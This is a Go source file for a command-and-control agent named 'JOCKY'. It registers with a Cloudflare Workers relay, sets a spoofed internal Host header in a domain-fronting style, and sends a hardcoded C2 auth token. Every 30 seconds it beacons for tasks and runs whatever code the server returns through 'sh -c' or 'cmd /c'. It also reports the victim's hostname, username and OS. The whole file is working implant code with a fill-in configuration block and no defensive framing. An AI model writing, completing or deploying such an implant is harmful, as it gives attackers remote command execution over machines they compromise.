package main

import (
    "bytes"
    "crypto/tls"
    "encoding/json"
    "fmt"
    "net/http"
    "os"
    "os/exec"
    "runtime"
    "time"
)

// ============================================================
// CONFIGURATION – REPLACE WITH YOUR ACTUAL VALUES
// ============================================================
const (
    LISTENER_URL = "https://jocky-relay.dm2528v.workers.dev"
    FRONT_DOMAIN = "jocky-relay.dm2528v.workers.dev"
    HOST_HEADER  = "c2-api.jocky.internal"
    C2_AUTH      = "supersecret123"
)

var AgentID = "agent-" + randomString(8)

func randomString(n int) string {
    const letters = "abcdef0123456789"
    b := make([]byte, n)
    for i := range b {
        b[i] = letters[time.Now().UnixNano()%int64(len(letters))]
    }
    return string(b)
}

// ============================================================
// STRUCTS MATCHING MANAGER API
// ============================================================
type RegisterRequest struct {
    AgentID  string `json:"agent_id"`
    Hostname string `json:"hostname"`
    OS       string `json:"os"`
}

type HeartbeatRequest struct {
    AgentID string `json:"agent_id"`
}

type DeploymentResponse struct {
    Deployment *struct {
        DeployID   string `json:"deploy_id"`
        ScriptID   string `json:"script_id"`
        Code       string `json:"code"`
        HashBefore string `json:"hash_before"`
    } `json:"deployment"`
}

func main() {
    hostname, _ := os.Hostname()
    username := os.Getenv("USER")
    if runtime.GOOS == "windows" {
        username = os.Getenv("USERNAME")
    }
    osStr := runtime.GOOS + " " + runtime.GOARCH

    fmt.Printf("[+] JOCKY Agent %s started\n", AgentID)
    fmt.Printf("[+] Beaconing to: %s\n", LISTENER_URL)

    // Step 1: Register
    if err := registerAgent(hostname, username, osStr); err != nil {
        fmt.Printf("[!] Registration failed: %v\n", err)
        // Continue anyway – heartbeat might fail if not registered
    }

    // Step 2: Main loop – heartbeat
    for {
        task, err := sendHeartbeat()
        if err != nil {
            fmt.Printf("[!] Heartbeat error: %v\n", err)
            time.Sleep(30 * time.Second)
            continue
        }

        if task != "" {
            fmt.Printf("[TASK] Received: %s\n", task)
            result := executeTask(task)
            fmt.Printf("[RESULT] %s\n", result)
            // Optionally send result back? The manager doesn't have a result endpoint yet.
            // You can add a /result endpoint if needed.
        }

        time.Sleep(30 * time.Second)
    }
}

// registerAgent calls the /register endpoint
func registerAgent(hostname, username, osStr string) error {
    reqBody := RegisterRequest{
        AgentID:  AgentID,
        Hostname: hostname,
        OS:       osStr,
    }
    body, _ := json.Marshal(reqBody)
    url := LISTENER_URL + "/api/v1/agent/register"
    fmt.Printf("[DEBUG] Registering at: %s\n", url)

    req, err := http.NewRequest("POST", url, bytes.NewReader(body))
    if err != nil {
        return err
    }
    req.Header.Set("X-C2-Auth", C2_AUTH)
    req.Header.Set("Host", FRONT_DOMAIN)
    req.Header.Set("Content-Type", "application/json")

    client := &http.Client{
        Timeout: 10 * time.Second,
        Transport: &http.Transport{
            TLSClientConfig: &tls.Config{
                ServerName: FRONT_DOMAIN,
            },
        },
    }

    resp, err := client.Do(req)
    if err != nil {
        return err
    }
    defer resp.Body.Close()

    if resp.StatusCode != http.StatusOK && resp.StatusCode != http.StatusCreated {
        return fmt.Errorf("registration failed: %d", resp.StatusCode)
    }
    fmt.Println("[+] Registration successful")
    return nil
}

// sendHeartbeat sends a heartbeat and returns a deployment script (if any)
func sendHeartbeat() (string, error) {
    reqBody := HeartbeatRequest{AgentID: AgentID}
    body, _ := json.Marshal(reqBody)
    url := LISTENER_URL + "/api/v1/agent/heartbeat"
    fmt.Printf("[DEBUG] Heartbeat to: %s\n", url)

    req, err := http.NewRequest("POST", url, bytes.NewReader(body))
    if err != nil {
        return "", err
    }
    req.Header.Set("X-C2-Auth", C2_AUTH)
    req.Header.Set("Host", FRONT_DOMAIN)
    req.Header.Set("Content-Type", "application/json")

    client := &http.Client{
        Timeout: 10 * time.Second,
        Transport: &http.Transport{
            TLSClientConfig: &tls.Config{
                ServerName: FRONT_DOMAIN,
            },
        },
    }

    resp, err := client.Do(req)
    if err != nil {
        return "", err
    }
    defer resp.Body.Close()

    if resp.StatusCode != http.StatusOK {
        return "", fmt.Errorf("heartbeat failed: %d", resp.StatusCode)
    }

    var deploymentResp DeploymentResponse
    if err := json.NewDecoder(resp.Body).Decode(&deploymentResp); err != nil {
        return "", err
    }

    if deploymentResp.Deployment != nil {
        // Return the code to execute
        return deploymentResp.Deployment.Code, nil
    }

    return "", nil
}

// executeTask runs a command and returns the output.
func executeTask(task string) string {
    const errPrefix = "error: "
    switch task {
    case "whoami":
        cmd := exec.Command("whoami")
        out, err := cmd.Output()
        if err != nil {
            return errPrefix + err.Error()
        }
        return string(out)
    case "hostname":
        cmd := exec.Command("hostname")
        out, err := cmd.Output()
        if err != nil {
            return errPrefix + err.Error()
        }
        return string(out)
    default:
        var cmd *exec.Cmd
        if runtime.GOOS == "windows" {
            cmd = exec.Command("cmd", "/c", task)
        } else {
            cmd = exec.Command("sh", "-c", task)
        }
        out, err := cmd.Output()
        if err != nil {
            return errPrefix + err.Error()
        }
        return string(out)
    }
}